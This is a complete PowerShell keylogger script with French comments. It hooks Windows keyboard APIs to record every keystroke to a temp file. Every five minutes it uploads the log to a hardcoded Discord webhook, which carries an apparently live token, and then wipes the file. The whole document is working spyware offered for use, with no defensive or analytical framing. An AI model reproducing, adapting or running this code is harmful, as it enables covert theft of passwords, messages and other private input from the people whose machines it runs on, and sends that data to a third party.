<#
PowerShell keystroke logger - Mode INFINI
Envoie le fichier sur Discord toutes les 5 minutes
#>

function KeyLog {

    $MAPVK_VK_TO_VSC = 0x00
    $MAPVK_VSC_TO_VK = 0x01
    $MAPVK_VK_TO_CHAR = 0x02
    $MAPVK_VSC_TO_VK_EX = 0x03
    $MAPVK_VK_TO_VSC_EX = 0x04

    $virtualkc_sig = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
'@

    $kbstate_sig = @'
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
'@

    $mapchar_sig = @'
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
'@

    $tounicode_sig = @'
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

    $getKeyState = Add-Type -MemberDefinition $virtualkc_sig -name "Win32GetState" -namespace Win32Functions -passThru
    $getKBState = Add-Type -MemberDefinition $kbstate_sig -name "Win32MyGetKeyboardState" -namespace Win32Functions -passThru
    $getKey = Add-Type -MemberDefinition $mapchar_sig -name "Win32MyMapVirtualKey" -namespace Win32Functions -passThru
    $getUnicode = Add-Type -MemberDefinition $tounicode_sig -name "Win32MyToUnicode" -namespace Win32Functions -passThru

    # Variables pour envoyer toutes les 5 minutes
    $lastSendTime = Get-Date
    $sendInterval = 300  # 5 minutes en secondes

    Write-Host "KeyLogger demarré en mode INFINI..." -ForegroundColor Green
    Write-Host "Envoi sur Discord toutes les 5 minutes" -ForegroundColor Yellow

    while ($true) {
        # Vérifier s'il faut envoyer les logs
        $timeSinceLastSend = (Get-Date) - $lastSendTime
        if ($timeSinceLastSend.TotalSeconds -ge $sendInterval) {
            Send-LogsToDiscord
            $lastSendTime = Get-Date
        }

        Start-Sleep -Milliseconds 40
        $gotit = ""

        for ($char = 1; $char -le 254; $char++) {
            $vkey = $char
            $gotit = $getKeyState::GetAsyncKeyState($vkey)

            if ($gotit -eq -32767) {

                $l_shift = $getKeyState::GetAsyncKeyState(160)
                $r_shift = $getKeyState::GetAsyncKeyState(161)
                $caps_lock = [console]::CapsLock

                $scancode = $getKey::MapVirtualKey($vkey, $MAPVK_VSC_TO_VK_EX)

                $kbstate = New-Object Byte[] 256
                $checkkbstate = $getKBState::GetKeyboardState($kbstate)

                $mychar = New-Object -TypeName "System.Text.StringBuilder"
                $unicode_res = $getUnicode::ToUnicode($vkey, $scancode, $kbstate, $mychar, $mychar.Capacity, 0)

                if ($unicode_res -gt 0) {
                    $logfile = "$env:temp\key.log"
                    Out-File -FilePath $logfile -Encoding Unicode -Append -InputObject $mychar.ToString()
                }
            }
        }
    }
}

# Fonction d'envoi sur Discord
function Send-LogsToDiscord {
    $logfile = "$env:temp\key.log"
    $webhook = "https://discord.com/api/webhooks/1555461994620919905/ridzerjQFMTS4KbMqrnenxmt6pWs8WHQH5DCnMQHTJMMPt1izAgfxXXv7fNF6J6oDjyS"

    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Envoi du fichier sur Discord..." -ForegroundColor Yellow

    if (Test-Path $logfile) {
        try {
            # Lire le fichier en bytes
            $fileBytes = [System.IO.File]::ReadAllBytes($logfile)
            $fileName = Split-Path $logfile -Leaf

            # Créer la requête multipart
            $boundary = [System.Guid]::NewGuid().ToString()
            $LF = "`r`n"

            $bodyLines = @(
                "--$boundary",
                'Content-Disposition: form-data; name="payload_json"',
                "",
                '{"content":"Fichier keylog joint"}',
                "--$boundary",
                "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
                "Content-Type: application/octet-stream",
                "",
                [System.Text.Encoding]::GetEncoding('iso-8859-1').GetString($fileBytes),
                "--$boundary--"
            )

            $body = $bodyLines -join $LF

            $headers = @{
                "Content-Type" = "multipart/form-data; boundary=$boundary"
            }

            Invoke-RestMethod -Uri $webhook -Method Post -Body $body -Headers $headers -ErrorAction Stop
            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Fichier envoye avec succes !" -ForegroundColor Green
            
            # Vider le fichier après envoi
            Clear-Content -Path $logfile -Force
            
        } catch {
            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Erreur : $_" -ForegroundColor Red
        }
    }
}

# Lancer le keylogger
KeyLog
